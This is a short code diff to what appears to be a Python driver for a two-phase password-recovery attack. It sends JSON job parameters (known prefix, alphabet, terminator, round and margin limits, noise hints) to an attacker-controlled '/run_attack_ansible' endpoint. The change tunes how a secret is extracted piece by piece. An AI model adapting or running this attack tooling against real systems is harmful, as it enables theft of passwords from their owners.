@@ -153,6 +153,7 @@ def main() -> int:
         "terminator": "\x00",
         "min_margin": 8,
         "max_rounds": 96,
+        "noise_hints": [ 1 ],
     }).encode("utf-8")
     t1 = time.time()
     r1 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
@@ -178,10 +179,11 @@ def main() -> int:
     phase2_body = json.dumps({
         "known_prefix": phase2_prefix,
         "alphabet": PHASE2_ALPHABET,
-        "max_length": password_length + 4,
+        "max_length": length_byte,
         "terminator": "\n",
         "min_margin": 8,
         "max_rounds": 96,
+        "noise_hints": [ 1 ] * length_byte
     }).encode("utf-8")
     r2 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
               body=phase2_body, content_type="application/json")
